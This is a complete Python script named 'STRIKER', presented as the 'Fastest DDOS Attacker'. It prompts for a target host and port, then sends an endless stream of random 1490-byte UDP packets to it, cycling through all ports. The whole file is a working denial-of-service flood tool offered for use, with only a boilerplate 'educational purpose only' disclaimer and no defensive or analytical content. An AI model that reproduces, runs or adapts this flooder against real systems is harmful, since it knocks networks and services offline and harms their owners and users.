import sys
import os
import time
import socket
import random
from datetime import datetime

W = '\033[0m'  # white (normal)
R = '\033[0;31m'  # red
G = '\033[0;32m'  # green
O = '\033[0;33m'  # orange
B = '\033[0;34m'  # blue
P = '\033[0;35m'  # purple
C = '\033[0;36m'  # Cyan

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")

logo = R + """
     _____    ______   ____     ___   __ __    _____    ____ 
    / ___/   /_  __/  / __ \   <  /  / //_/   |__  /   / __ |
    \__ \     / /    / /_/ /   / /  / ,<       /_ <   / /_/ /
   ___/ /    / /    / _, _/   / /  / /| |    ___/ /  / _, _/ 
  /____/    /_/    /_/ |_|   /_/  /_/ |_|   /____/  /_/ |_|  
                 \033[0;36m-- Fastest DDOS Attacker --"""
print(logo)

print(G+"  x~~~~~~~~~~~~~~~~~~~~~~~~~~~ x ~~~~~~~~~~~~~~~~~~~~~~~~~~~x")
print(G+"  | ["+R+"Author   "+G+"]"+C+" NullS0UL "+G+"                                   |")
print(G+"  | ["+R+"Tool Name"+G+"]"+C+" STRIKER"+G+"                                     |")
print(G+"  | ["+R+"Developer"+G+"]"+C+" NullS0UL"+G+"                                    |")
print(G+"  | ["+R+"Facebook "+G+"]"+C+" www.facebook.com/nulls0ul.ofc"+G+"               |")
print(G+"  | ["+R+"Telegram"+G+" ]"+C+" @NullS0UL"+G+"                                   |")
print(G+"  x~~~~~~~~~~~~~~~~~~~~~~~~~~~ x ~~~~~~~~~~~~~~~~~~~~~~~~~~~x")
print(G+"  |"+C+" This tool is created for educational purpose only,"+G+"      |")
print(G+"  |"+C+" The developer won't be responsible"+G+"                      |")
print(G+"  |"+C+" for any misuse of the tool."+G+"                             |")
print(G+"  x~~~~~~~~~~~~~~~~~~~~~~~~~~~ x ~~~~~~~~~~~~~~~~~~~~~~~~~~~x\n")


ip = input(C+"  Enter Host : "+W)
port = input(C+"  Enter Port : "+W)
port = int(port)

sent = 0

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
